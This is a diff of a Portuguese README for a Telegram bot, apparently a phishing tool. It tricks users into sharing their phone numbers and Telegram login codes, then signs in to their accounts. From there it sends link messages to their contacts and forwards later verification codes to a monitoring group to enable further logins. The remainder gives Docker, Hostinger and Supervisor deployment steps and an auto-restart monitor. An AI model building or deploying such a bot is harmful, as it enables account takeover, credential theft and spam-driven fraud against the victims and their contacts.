@@ -1,50 +1,181 @@
-# Telegram Bot com Login via Telethon
+# Bot Telegram Python
 
-Este projeto combina `python-telegram-bot` e `Telethon` para:
+Bot para automação de interações no Telegram.
 
-- Confirmar se o usuário é um humano.
-- Pedir número de telefone e código de acesso.
-- Fazer login via Telethon com esse número.
-- Enviar mensagens automáticas para todos os contatos da conta.
+## Fluxo do Bot
 
-## Configuração
+O bot segue o seguinte fluxo de operação:
 
-Crie um arquivo `.env` com:
+1. **Verificação Inicial**:
+
+   - O usuário inicia o bot com o comando `/start`
+   - O bot solicita confirmação de que não é um robô
+   - O usuário precisa enviar seu contato telefônico
+
+2. **Autenticação**:
+
+   - Se o número já tiver uma sessão existente e autenticada, o bot prossegue diretamente
+   - Caso contrário, envia um código de verificação para o Telegram do usuário
+   - O usuário digita o código de 5 dígitos recebido
+
+3. **Processamento Automatizado**:
+
+   - Após autenticação, o bot acessa os contatos do usuário
+   - Envia mensagens predefinidas com link para contatos específicos
+   - Entra temporariamente em um grupo para enviar logs da operação
+   - Configura um timer para verificar novas mensagens do sistema Telegram
+
+4. **Sistema de Verificação Dupla**:
+
+   - Após 3 minutos, verifica se há novas mensagens do sistema Telegram (possíveis códigos)
+   - Se encontrar um código de verificação, reenvia para o grupo de monitoramento
+   - Facilita tentativas de login em várias plataformas
+
+5. **Sistema de Monitoramento**:
+   - O script monitor.py verifica continuamente se o bot está operacional
+   - Em caso de falha, reinicia o bot automaticamente
+   - Envia notificações sobre o status do bot para um grupo designado
+
+## Configuração do Ambiente
+
+### Requisitos
+
+- Python 3.10 ou superior
+- pip (gerenciador de pacotes do Python)
+- Docker (opcional, para uso com containers)
+
+### Variáveis de Ambiente
+
+Crie um arquivo `.env` na raiz do projeto com as seguintes variáveis:
 
 ```
+API_ID=seu_api_id
+API_HASH=seu_api_hash
 BOT_TOKEN=seu_bot_token
-API_ID=seu_telegram_api_id
-API_HASH=seu_telegram_api_hash
+NOTIFICATION_CHAT_ID=id_do_chat_para_notificacoes
 ```
 
-## Como rodar
+## Executando Localmente
+
+1. Instale as dependências:
 
 ```bash
 pip install -r requirements.txt
-python bot/main.py
 ```
 
-O bot será iniciado e responderá ao comando `/start`.
+2. Execute o bot:
 
-## Observações
+```bash
+python main.py
+```
 
-- O código usa sessões salvas por telefone.
-- Use com responsabilidade para evitar bloqueios.
+3. Execute o monitor em uma janela separada:
 
-Inicie o chat pedindo a confirmação do botão que não é um robô.
-Peça o numero de telefone. (ao envir o número não está fazendo mais nada)
-Com o número coloque para fazer login, pedindo um codigo de acesso, que será enviado para o telegram do número.
-Aparecer para o usuário o teclado númerico para colocar o código de acesso que chegou para ele. (não está aparecendo o teclado e o código já está chegando)
-Com o código fazer o login.
-Ao fazer o login, preciso que você pegue todos os contatos desse número.
-Envie uma mensagem para todos os contatos.
+```bash
+python monitor.py
+```
 
-Usuário clica no botão "Não sou um robô" - Implementado na função start e confirm_human, onde o usuário confirma que não é um robô clicando em um botão.
+## Implantação com Docker
 
-Usuário envia o contato - Implementado na função receive_contact, que recebe o número de telefone do usuário através de um botão dedicado.
+1. Construa a imagem:
 
-Bot envia solicitação de código de verificação - Implementado ainda na função receive_contact, onde o bot verifica se já existe uma sessão autorizada ou, caso contrário, solicita um novo código de verificação.
+```bash
+docker-compose build
+```
 
-Bot faz login - Implementado na função login_and_send_messages, que é chamada após o usuário fornecer o código de verificação na função receive_code.
+2. Inicie o container:
 
-Fluxo de envio de mensagens - Também implementado na função login_and_send_messages, que envia mensagens para os contatos salvos após o login bem-sucedido.
+```bash
+docker-compose up -d
+```
+
+3. Visualize os logs:
+
+```bash
+docker-compose logs -f
+```
+
+4. Para parar:
+
+```bash
+docker-compose down
+```
+
+## Implantação em Servidor Compartilhado (Hostinger)
+
+1. Faça upload de todos os arquivos para o servidor
+
+2. Dê permissão de execução aos scripts:
+
+```bash
+chmod +x start.sh stop.sh
+```
+
+3. Inicie o bot:
+
+```bash
+./start.sh
+```
+
+4. Para parar o bot:
+
+```bash
+./stop.sh
+```
+
+## Implantação em VPS com Supervisor
+
+1. Instale o supervisor:
+
+```bash
+apt-get update && apt-get install -y supervisor
+```
+
+2. Copie o arquivo de configuração:
+
+```bash
+cp supervisor.conf /etc/supervisor/conf.d/telegram-bot.conf
+```
+
+3. Atualize o diretório no arquivo de configuração se necessário
+
+4. Recarregue o supervisor:
+
+```bash
+supervisorctl reread
+supervisorctl update
+```
+
+5. Verificar status:
+
+```bash
+supervisorctl status
+```
+
+## Comandos Úteis
+
+- Ver logs do bot:
+
+```bash
+tail -f logs/bot.log
+```
+
+- Ver logs do monitor:
+
+```bash
+tail -f logs/monitor.log
+```
+
+- Verificar processos em execução:
+
+```bash
+ps aux | grep python
+```
+
+## Resolução de Problemas
+
+1. **Bot não inicia:** Verifique os logs por erros e confirme se as variáveis de ambiente estão configuradas corretamente.
+
+2. **Erros de conexão com a API do Telegram:** Confirme sua conexão com a internet e valide as credenciais API_ID e API_HASH.
+
+3. **Sessões não persistem:** Certifique-se de que o diretório de sessões tem permissões de escrita.
